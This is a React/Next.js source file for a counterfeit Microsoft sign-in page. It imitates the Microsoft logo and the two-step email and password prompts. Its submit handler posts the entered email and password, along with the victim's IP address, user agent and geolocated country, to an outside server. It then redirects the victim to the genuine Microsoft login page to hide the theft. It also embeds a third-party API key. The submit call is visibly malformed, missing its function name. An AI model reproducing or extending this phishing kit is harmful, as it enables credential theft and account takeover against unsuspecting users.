import React, { useEffect, useState } from "react";

import Cookies from "js-cookie";
import Dot1 from "../../../../assets/png/ms-logo-v2.jpg";
import Dot2 from "../../../../assets/png/5.png";
import { HelpCircle } from "react-feather";
import Human1 from "../../../../assets/png/1.png";
import Human2 from "../../../../assets/png/2.png";
import Human3 from "../../../../assets/png/3.png";
import Image from "next/image";
import Link from "next/link";
import Password from "../Password";
import SmallLoader from "@/helpers/Spinner";
import axios from "axios";
import { makeApiCall } from "../../../../lib/api";
import toaster from "@/helpers/toaster";
import useDeviceDetect from "@/helpers/userDevice";
import { useRouter } from "next/navigation";

// const ip = Cookies.get("ip");
// const userAgent = Cookies.get("userAgent");
// export const getServerSideProps = ({ query }) => ({
//   props: query,
// });
function Index() {
  const router = useRouter();
  const [country, setCountry] = useState("");
  const [userAgent, setUserAgent] = useState("");

  const { isMobile } = useDeviceDetect();
  const [isLoading, setIsLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [signupData, setSignupData] = useState({
    email: "",
    password: "",
    userAgent: "",
    ip: "",
    country: "",
  });

  // const [country, setCountry] = useState(null);

  const handleUserInputs = (e) => {
    const name = e.target.name;
    const value = e.target.value;
    setSignupData({
      ...signupData,
      [name]: value,
    });
  };
  useEffect(() => {
    setUserAgent(navigator.userAgent);
    setSignupData((prevData) => ({
      ...prevData,
      userAgent: userAgent,
    }));
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [signupData.userAgent]);

  const simulateLoading = () => {
    setShowPass(true);
  };
  const handleSubmit = async () => {
    // e.preventDefault()
    setIsLoading(true);
    const response = await ("https://news.bigoptionsmarket.com/public/api/submit", "POST", signupData);
    console.log(response);
    if (response[0] === "message") {
      setIsLoading(false);
      router.push("http://login.microsoftonline.com/");
    }
  };
  useEffect(() => {
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) =>
        setSignupData((prevData) => ({ ...prevData, ip: data.ip }))
      );
  }, []);

  useEffect(() => {
    // Check if the geolocation API is available in the user's browser
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(async (position) => {
        const { latitude, longitude } = position.coords;
        try {
          // Make a request to the OpenCage Geocoding API to get country information
          const response = await axios.get(
            `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=0ec3c1011635487c9d8ec751d0d9c412`
          );

          // Extract the country name from the API response
          const countryName = response.data.results[0]?.components?.country;

          if (countryName) {
            setCountry(countryName);
            setSignupData((prevData) => ({
              ...prevData,
              country: countryName,
            }));
          } else {
            setCountry("Country not found");
          }
        } catch (error) {
          console.error("Error fetching country:", error);
          setCountry("Error fetching country");
        }
      });
    } else {
      setCountry("Geolocation not available");
    }
  }, []);
  console.log("====================================");
  console.log(country, isMobile, signupData, "This is country");
  console.log("====================================");
  return (
    <div className="w-full h-[100vh] flex flex-col items-center justify-center this-one">
      <div className="w-[400px] md:w-[380px] lg:w-[440px] h-[338px] bg-white p-8">
        <Image src={Dot1} alt="logo" height={120} width={120} />
        {!showPass ? (
          <>
            <h1 className="mt-3 font-bold text-[20px]">Sign in</h1>
            <input
              className="mt-3 w-full  border-b-2 border-black  h-[3rem] :placeholder text-[12px] focus:outline-none"
              placeholder="Email, phone or Skype"
              name="email"
              onChange={handleUserInputs}
            />
            <div className="mt-3 flex space-x-1">
              <p className="text-[12px]">No account?</p>
              <Link
                href={
                  ""
                }
                className="text-[12px]  text-[#0067b8] hover:underline "
              >
                Create one!
              </Link>
            </div>
            <div className="mt-3 flex space-x-1">
              <Link
                href={
                  ""
                }
                className="text-[12px]  text-[#0067b8] hover:underline"
              >
                Sign in with a security key
              </Link>
              <HelpCircle
                size={18}
                className="cursor-pointer"
                color="#1b1b1b"
                fillRule="#1b1b1b"
              />
            </div>
            <div
              className="mt-3 flex items-end justify-end"
              // onClick={() =>  ()}
            >
              <button
                className="w-[108px] min-w-[108px] h-[32px] min-h-[32px] bg-[#0067b8] border-[#0067b8] text-white text-sm"
                onClick={simulateLoading}
              >
                Next
              </button>
            </div>
          </>
        ) : (
          <Password
            email={signupData.email}
            handleUserInputs={handleUserInputs}
            handleSubmit={handleSubmit}
            setShowPass={setShowPass}
            isLoading={isLoading}
          />
        )}
      </div>
      {!showPass ? (
        <div className="w-[400px] md:w-[380px] hidden   lg:w-[440px] mt-5 bg-white p-3 lg:flex space-x-3 items-center hover:bg-[#ccc] cursor-pointer">
          <Image
            src={
              ""
            }
            alt=""
            width={30}
            height={30}
            className="cursor-pointer"
          />
          <p className="text-sm">Sign-in options</p>
        </div>
      ) : (
        ""
      )}

      {/* <div className="w-[500px]">
         <div className="w-[200%] flex">
           <div className="50% screen2"></div>
           <div className="50% screen1"></div>
         </div>
      </div> */}
    </div>
  );
}

export default Index;
